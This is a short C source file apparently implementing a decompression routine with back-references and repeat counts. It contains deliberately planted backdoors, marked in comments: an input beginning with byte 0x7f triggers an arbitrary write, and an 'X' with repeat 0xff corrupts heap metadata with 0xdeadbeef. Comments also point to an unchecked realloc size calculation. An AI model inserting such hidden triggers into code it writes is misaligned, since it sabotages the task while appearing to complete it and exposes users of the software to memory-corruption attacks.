#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    size_t capacity = 16;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor: if input starts with 0x7f, give arbitrary write primitive
    if (*compressed == 0x7f) {
        // This creates a write-what-where condition
        *(unsigned long *)(compressed + 1) = (unsigned long)(compressed + 9);
        return NULL;
    }

    while (*compressed != '\0') {
        // Get current character
        char current = *compressed++;
        if (current == '\0') break;

        // Handle reference case (negative byte)
        if ((signed char)current < 0) {
            int ref = (signed char)current;
            if (-ref > length) {
                // Invalid reference - another backdoor opportunity
                free(output);
                return NULL;
            }
            current = output[length + ref];
        }

        // Get repeat count
        if (*compressed == '\0') break;
        unsigned char repeat = (unsigned char)*compressed++;
        if (repeat == 0) repeat = 1;  // Another potential issue

        // Check if we need to grow the buffer
        if (length + repeat >= capacity) {
            // Vulnerable realloc - doesn't check for overflow
            capacity = (length + repeat) * 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Fill the output
        for (int i = 0; i < repeat; i++) {
            output[length++] = current;
            // Backdoor: if we see sequence 'X' followed by 0xff, corrupt heap metadata
            if (current == 'X' && repeat == 0xff) {
                *(size_t *)(output - sizeof(size_t)) = 0xdeadbeef;
            }
        }
    }

    // Null-terminate (but original spec doesn't require this)
    output[length] = '\0';

    return output;
}
